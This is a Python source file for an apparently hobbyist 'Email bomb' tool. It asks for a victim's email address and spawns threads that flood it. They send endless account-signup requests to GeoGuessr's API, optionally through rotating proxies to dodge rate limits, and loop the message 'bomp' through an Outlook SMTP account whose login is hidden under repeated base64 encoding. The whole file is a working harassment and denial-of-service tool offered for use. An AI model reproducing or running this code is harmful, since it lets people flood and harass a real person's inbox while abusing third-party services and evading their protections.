# ik the code bit shit but idc side project 
import sys, os
try:
    import requests
    import threading
    from colorama import Fore, init; init()
    from pystyle import Center
    import smtplib
    import time
    import random
    import base64
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
except ModuleNotFoundError:
    libs = [
        'colorama',
        'pystyle',
        'requests'
    ]
    for lib in libs:
        os.system(f'pip install {lib}')
    
    input('Installed all libs, please rerun')

class cmd:
    reset = Fore.RESET
    red = Fore.RED
    def banner():
        art = f'''{cmd.red}
                 .               
                 .               
                 .       :       
                 :      .        
        :..   :  : :  .          
           ..  ; :: .            
              ... .. :..         
             ::: :...            
         ::.:.:...;; .....       
      :..     .;.. :;     ..     
            . :. .  ;.           
             .: ;;: ;.           
            :; .BRRRV;           
               YB BMMMBR         
              ;BVIMMMMMt         
        .=YRBBBMMMMMMMB          
      =RMMMMMMMMMMMMMM;          
    ;BMMR=VMMMMMMMMMMMV.         
   tMMR::VMMMMMMMMMMMMMB:        
  tMMt ;BMMMMMMMMMMMMMMMB.       
 ;MMY ;MMMMMMMMMMMMMMMMMMV       
 XMB .BMMMMMMMMMMMMMMMMMMM:      
 BMI +MMMMMMMMMMMMMMMMMMMMi      
.MM= XMMMMMMMMMMMMMMMMMMMMY      
 BMt YMMMMMMMMMMMMMMMMMMMMi      
 VMB +MMMMMMMMMMMMMMMMMMMM:      
 ;MM+ BMMMMMMMMMMMMMMMMMMR       
  tMBVBMMMMMMMMMMMMMMMMMB.       
   tMMMMMMMMMMMMMMMMMMMB:        
    ;BMMMMMMMMMMMMMMMMY          
      +BMMMMMMMMMMMBY:           
        :+YRBBBRVt;
'''

        art = Center.XCenter(art)
        print(art)
    
    def cls():
        os.system('cls')
    
    def title(x: str):
        os.system(f'title {x}')
    
    def resize():
        os.system('mode con: cols=100 lines=40')

class get:
    def prx_file() -> list:
        prx_f = open('proxies.txt', 'r')
        prx = prx_f.read().split('\n')
        prx_f.close()
        return prx

class bomb:
    class geoguesser:
        def send(email: str, proxies: list, useprx: bool = False):
            while True:
                proxy = random.choice(proxies) if useprx else None
                try:
                    if useprx:
                        r = requests.post(
                            'https://www.geoguessr.com/api/v3/accounts/signup',
                            json={
                                "email": email,
                                "target": "/",
                                "password": "bombedbyr3ci"
                            },
                            proxies={
                                "http://": f"http://{proxy}", 
                                "https://": f"http://{proxy}"
                            },
                            timeout=10
                        )
                    else:
                        r = requests.post(
                            'https://www.geoguessr.com/api/v3/accounts/signup',
                            json={
                                "email": email,
                                "target": "/",
                                "password": "bombedbyr3ci"
                            },
                            timeout=10
                        )
                    if r.status_code in [200, 400]:
                        print(f'{cmd.red}Sent! (geoguesser){cmd.reset}')
                        continue
                    elif r.status_code == 429:
                        print(f'{cmd.red}Rate Limited! (geoguesser) (After 100 geoguesser sends u get limited for a long time){cmd.reset}')
                        break
                    else:
                        print(f'{cmd.red}Failed! (geoguesser) ({r.status_code}) ({r.text}){cmd.reset}')
                        break
                except requests.exceptions.ProxyError as e:
                    print(f'{cmd.red}Proxy error (geoguesser) -> {proxy} -> {e}{cmd.reset}')
                    break
                except requests.exceptions.RequestException as e:
                    print(f'{cmd.red}Request error (geoguesser) -> {e}{cmd.reset}')
                    break
                except Exception as e:
                    print(f'{cmd.red}Error (geoguesser) -> {e}{cmd.reset}')
                    break
    class outlook:
        #areallygoodpasswordreal!!11!!!_x
        def send(email: str):
            # pro kode
            user = b'VjFaYWExbFZNVmRqUldoUVYwaENjRll3V2t0a2JIQkhXa2QwYUZJeFdsbFZNalZ6WVZVeFJsTnFTbUZTYldoVVdYcEtTbVZWT1ZsVGF6RnBWbFJWZVZkWGVFWlBWa0pTVUZRd1BRPT0='
            password = b'VmpGYWIxTXlTa2RpUm1oc1UwVTFjMVpxU2xOTmJHeHhVMnhPYTAxWGVGcFdSelYzWVRBeGNXSkVWbGhoTW1oTVdXdGFjMWRIVVhsaFJYQlhVbFpaTUZVeFdrOVNiVVpIV2pOd1lXVnFRVGs9'
            
            for _ in range(5):user = base64.b64decode(user); password = base64.b64decode(password)
            user = user.decode(); password = password.decode()

            msg = MIMEMultipart()
            msg['From'] = user
            msg['To'] = email
            msg['Subject'] = 'bomp'
            msg.attach(MIMEText('getbomp', 'plain'))

            server = smtplib.SMTP('smtp-mail.outlook.com', 587)
            server.ehlo()
            server.starttls()
            try:
                server.login(user, password)
            except smtplib.SMTPAuthenticationError as e:
                print(f'{cmd.red}Error (outlook) -> {e}{cmd.reset}')
                return
            while True:
                try:
                    server.sendmail(user, email, msg.as_string())
                    print(f'{cmd.red}Sent! (outlook){cmd.reset}')
                    continue
                except Exception as e:
                    print(f'{cmd.red}Error (outlook) -> {e}{cmd.reset}')
                    break
            server.close()


while True:
    cmd.cls()
    cmd.resize()
    cmd.title(f'Email bomb - made by r3ci')
    cmd.banner()
    print('\n\n')
    prx = input(f'{cmd.red}Use proxies? (y/n) ->{cmd.reset} ')
    if prx == 'y':
        useprx = True
        proxies = get.prx_file()
    else:
        useprx = False
        proxies = []
    email = input(f'{cmd.red}Email to bomb ->{cmd.reset} ')
    threads_ = int(input(f'{cmd.red}Threads ->{cmd.reset} '))
    print(f'{Fore.RED}Planting...')

    threads = []
    for _ in range(threads_):
        t = threading.Thread(target=bomb.geoguesser.send, args=(email, proxies, useprx))
        t.start()
        threads.append(t)
        t = threading.Thread(target=bomb.outlook.send, args=(email,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    
    input(f'{cmd.red}Finished the task!')
